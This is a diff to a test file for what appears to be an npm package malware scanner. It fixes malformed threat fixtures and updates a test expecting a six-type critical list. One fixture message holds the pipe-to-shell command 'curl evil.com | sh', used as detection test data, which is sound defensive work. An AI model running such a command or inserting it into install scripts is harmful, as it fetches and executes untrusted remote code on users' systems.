@@ -35,8 +35,7 @@ async function runSingleFireCriticalFloorTests() {
 
   test('Floor lifts low-scoring package with lifecycle_shell_pipe@CRITICAL to 75', () => {
     const result = makeResult([
-      { type: 'lifecycle_shell_pipe',
-      'gyp_phantom_exec', severity: 'CRITICAL', file: 'package.json', message: 'curl evil.com | sh' }
+      { type: 'lifecycle_shell_pipe', severity: 'CRITICAL', file: 'package.json', message: 'curl evil.com | sh' }
     ], 25);
     applySingleFireCriticalFloor(result);
     assert(result.summary.riskScore === SINGLE_FIRE_CRITICAL_FLOOR,
@@ -55,8 +54,7 @@ async function runSingleFireCriticalFloorTests() {
 
   test('Floor does NOT trigger on LOW severity (severity gate)', () => {
     const result = makeResult([
-      { type: 'lifecycle_shell_pipe',
-      'gyp_phantom_exec', severity: 'LOW', file: 'package.json', message: 'borderline match' }
+      { type: 'lifecycle_shell_pipe', severity: 'LOW', file: 'package.json', message: 'borderline match' }
     ], 12);
     const triggers = applySingleFireCriticalFloor(result);
     assert(triggers.length === 0, `Expected 0 triggers (LOW filtered), got ${triggers.length}`);
@@ -110,7 +108,7 @@ async function runSingleFireCriticalFloorTests() {
     assert(applySingleFireCriticalFloor({ threats: [], summary: { riskScore: 10 } }).length === 0);
   });
 
-  test('SINGLE_FIRE_CRITICAL_TYPES set composition is the validated 5-type list', () => {
+  test('SINGLE_FIRE_CRITICAL_TYPES set composition is the validated 6-type list', () => {
     const expected = new Set([
       'known_malicious_hash',
       'known_malicious_package',
